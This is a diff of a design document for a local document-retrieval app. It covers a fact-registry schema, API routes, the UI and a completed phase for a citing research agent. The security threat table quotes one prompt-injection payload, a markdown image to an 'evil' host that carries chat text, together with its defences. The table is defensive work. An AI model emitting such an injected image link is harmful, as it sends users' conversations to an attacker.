@@ -420,17 +420,19 @@ CREATE TABLE messages (
   supported INTEGER, model TEXT, created_at TEXT
 );
 
--- Brains (§12, §13) -----------------------------------------------------------------------
+-- Brains (§12, §13), schema v7 -------------------------------------------------------------
 CREATE TABLE brain_facts (                -- registry: the source of truth for fact IDs
   model TEXT, fact_id TEXT,               -- e.g. 'deepseek-r1:8b', 'F-0012'
-  line_sha TEXT,                          -- hash of the approved [FACT] line
+  line TEXT,                              -- the registered [FACT] line, for Restore
+  line_sha TEXT,                          -- hash of that line
+  claim TEXT,
   status TEXT,                            -- active|stale|broken|deleted
-  added_at TEXT, session_id INTEGER, reason TEXT,
+  added_at TEXT, run_id INTEGER, reason TEXT,
   PRIMARY KEY (model, fact_id)
 );
 CREATE TABLE fact_citations (
   model TEXT, fact_id TEXT, ord INTEGER,
-  doc_sha256 TEXT, chunk_text_sha TEXT, quote TEXT,
+  label TEXT, doc_sha256 TEXT, chunk_text_sha TEXT, quote TEXT,
   resolution TEXT,                        -- resolved|relocated|source_removed|broken
   resolved_chunk_id INTEGER, checked_at TEXT,
   PRIMARY KEY (model, fact_id, ord)
@@ -441,15 +443,19 @@ CREATE TABLE fact_queue (
   kind TEXT,                              -- new|merge
   target_fact_id TEXT,                    -- for merge
   claim TEXT, citations_json TEXT, reason TEXT,
-  status TEXT,                            -- pending|approved|rejected
-  created_at TEXT, decided_at TEXT
+  question TEXT,                          -- the sub-question it came from (closed-book probe)
+  related_json TEXT,                      -- near-duplicate / conflicting active facts
+  status TEXT,                            -- pending|approved|rejected|merged
+  run_id INTEGER, created_at TEXT, decided_at TEXT
 );
 CREATE TABLE rejected_facts (             -- never propose these again
   id INTEGER PRIMARY KEY, model TEXT, claim TEXT, citations_json TEXT,
   origin TEXT,                            -- queue_reject|deleted
   at TEXT
 );
-CREATE VIRTUAL TABLE brain_vec USING vec0(embedding float[1024]);   -- active + rejected fact embeddings
+CREATE TABLE brain_embeddings (id INTEGER PRIMARY KEY, model TEXT, kind TEXT, ref TEXT, text_sha TEXT);  -- kind: fact|rejected
+CREATE VIRTUAL TABLE brain_vec USING vec0(embedding float[1024]);   -- rowid = brain_embeddings.id
+CREATE TABLE agent_runs (id INTEGER PRIMARY KEY, model TEXT, question TEXT, status TEXT, result_json TEXT, error TEXT, created_at TEXT, finished_at TEXT);
 ```
 
 **Why the triggers.** `ON DELETE CASCADE` only works between regular tables. FTS5 and
@@ -817,7 +823,7 @@ resolved against the index, in order:
 | Email / API keys in a repo | — | **Safe by design:** the Crossref email lives in the global `~/.config/localrag/config.toml`, never in a workspace. Future API keys go in the **macOS Keychain**, never a config file; no secret is ever read from workspace config |
 | Global config readable by others | Email, known workspace paths, launch token | **Fixed:** `~/.config/localrag/` is 0700; its files are 0600 and written atomically |
 | `corpus/` in a public repo | Papers may be copyrighted or private | **Fixed:** `corpus/.gitignore` (`*`) ignores the documents by default; delete it to version them deliberately |
-| `brain/` in a public repo (Phase 7) | Brain files quote documents | Not auto-ignored yet; decide when Phase 7 is built |
+| `brain/` in a public repo | Brain files quote documents | `brain/.gitignore` with `*` is written with the first brain file, like `corpus/` (delete it to version brains) |
 | CSRF / DNS rebinding | Websites driving the local API | Host check, Origin check, per-launch token in an HttpOnly SameSite=Strict per-port cookie |
 | Prompt injection exfiltrating data | A document tells the model to emit `![](https://evil/?q=<chat>)` | CSP `img-src 'self' data: blob:` and `connect-src 'self'` block remote loads; model output goes through DOMPurify |
 | Malicious PDFs | PDF.js font-code execution (CVE-2024-4367 class); PDFium memory bugs | PDF.js 4.10.38 with `isEvalSupported: false`. **PDFium runs only in `localrag-pdf`, a helper process started per request under `sandbox-exec`** (no network, no file writes; verified). A crash comes back as "the PDF parser crashed on this file (signal N)", a hang is killed after a timeout, and either way only that file is marked failed. The server process never loads PDFium |
@@ -858,11 +864,13 @@ The server picks a free port and opens the browser on start.
 | `GET /api/brain/models` | Reasoning models + which have brain files |
 | `GET /api/brain/{model}` | Parsed brain (headings, thoughts, facts with statuses) + integrity report + file hash |
 | `PATCH/DELETE /api/brain/{model}/lines/{n}` | Edit/delete a thought or heading (`If-Match: <file hash>`) |
-| `PATCH/DELETE /api/brain/{model}/facts/{id}` | Edit (re-verified) / delete (→ rejected) a fact |
-| `POST /api/brain/{model}/organize` · `/undo` · `/check` | Organize, undo the last organize, re-check integrity |
+| `PATCH/DELETE /api/brain/{model}/facts/{id}` | Edit (re-verified) / delete (→ rejected) a fact (`If-Match`) |
+| `POST /api/brain/{model}/facts/{id}/restore` | Re-append a registered fact missing from the file |
+| `POST /api/brain/{model}/organize` · `/undo` | Organize, undo the last saved change (re-check = `GET` again) |
+| `GET /api/brain/{model}/last-change` | Previous and current file, for the diff |
 | `GET /api/brain/{model}/queue` | Proposed facts |
 | `POST /api/brain/{model}/queue/{id}/{approve\|reject\|merge}` | Queue actions (`approve` accepts an edited claim) |
-| `POST /api/agent/run` | (Phase 7) Run the reasoning agent; SSE adds `step`, `tool_call`, `tool_result`, `brain_update` |
+| `POST /api/agent/run` | Run the reasoning agent; SSE: `step`, `thinking`, `token`, `tool_call`, `tool_result`, `brain_update`, `warning`, `result` |
 
 ## 15. User interface
 
@@ -922,7 +930,9 @@ workspace menu, a Settings panel, and first-load dialogs.
 - **Second Brain** (Phase 7):
   - **Reasoning model selector** (installed models with `thinking` + `tools`). Models that have
     a brain file but are no longer installed appear read-only.
-  - **Main pane:** the selected model's brain in its current structure.
+  - **Main pane:** the selected model's accepted facts, in the brain's current structure. A
+    collapsible **Research a question with this model** box at the top runs the agent and
+    streams its steps (tool calls, dropped/queued proposals) and its cited answer.
     - Headings, `[THOUGHT]` lines (styled as interpretation) and facts: the claim, citation
       chips that open the highlighted source, and a status badge (active / stale / broken /
       unresolved).
@@ -1276,6 +1286,45 @@ Rule: `core` knows nothing about HTTP. The server, CLI, app and agent are thin s
 - Tools and agent loop; admission rules; `organize_brain` with undo.
 - *Exit:* an agent run proposes facts; approved facts appear in the right model's brain;
   `organize_brain` restructures without changing any fact line; `check` is clean.
+- **Done (2026-11-01):** all of the above (skipping Phase 6 for now).
+  - **Code:** `core/src/brain/` (`file`, `registry`, `integrity`, `queue`, `organize`),
+    `core/src/agent.rs`, `server/src/brain.rs`, the Second Brain tab, and the CLI commands
+    `localrag agent "<question>" --model M` and `localrag brain show|queue|approve|reject|organize|undo`.
+    `localrag check` now covers brains and the queue. Workspace config gains `reasoning_model`
+    and `agent_corpus_model` (unset: the reasoning model answers `ask_corpus` too).
+  - **Tool calling:** Ollama `tools`. `ask_corpus` runs the full grounded pipeline (§10) and
+    numbers each answer's citations `C1, C2, …` for the run, showing the quote and whether it
+    verified. Only verified citations can support a proposal. The final answer cites `[C#]` or
+    `[F#]`: each is replaced by its original source label (a fact by its citations), and any
+    other marker (`[C9]`, a leftover `[S1]`) is listed as not resolving. Runs are kept in
+    `agent_runs`.
+  - **Admission, as built:**
+    - **1:** quotes re-verified in the current chunk, then the strict judge must say "yes" for
+      at least one passage and "no" for none.
+    - **3:** the closed-book probe asks the brain's model the *sub-question* the citations
+      came from (no sources), then a judge compares its answer with the claim.
+    - **4:** rejected claims are compared by embedding, at ≥ 0.92.
+    - **5:** active facts at ≥ 0.92 make the proposal a merge.
+    - **6:** facts at ≥ 0.75 are checked for contradiction, and linked on approval.
+    - The thresholds are first guesses: calibrate as brains grow.
+  - **Integrity, as built:** checks run on every read of a brain (API, `read_brain`, organize,
+    `check`), which is cheap enough that no separate post-sync pass was needed. A hand-edited
+    fact line whose quotes still verify is accepted and re-registered; otherwise excluded.
+    `organize_brain` refuses to run while a fact is unresolved or a line invalid, so every fact
+    can be placed.
+  - **Real run** (`qwen3.5:4b` both as reasoning and corpus model, scratch workspace):
+    - "How long after a first cancer is a second cancer considered synchronous…?" took
+      2.5 min: 2 sub-questions, 1 proposal (2 Baicry quotes), queued and approved as F-0001.
+    - From the UI, a ctDNA question: the first proposal was **dropped** because its quote
+      didn't verify; a second, verified one was queued, approved as F-0002.
+    - **Organize** grouped the two facts under topic headings with `[THOUGHT]` lines, on the
+      first attempt. The diff showed only moves; **Undo** restored it; `check` was clean.
+  - 88 tests pass: file round-trips and escapes; registry; admission rules (unverified quote,
+    already known, merge, conflict link, rejected, tombstone, IDs never reused); integrity
+    (hand edits, unknown/duplicate/missing/deleted IDs, dangling thoughts, stale after removal
+    and back); organize (byte-identical fact lines, invalid layouts refused, one retry, undo);
+    an end-to-end agent run with a scripted model; brain routes need the token and refuse a
+    stale `If-Match` (409).
 
 **Later**
 - Bibliography export.
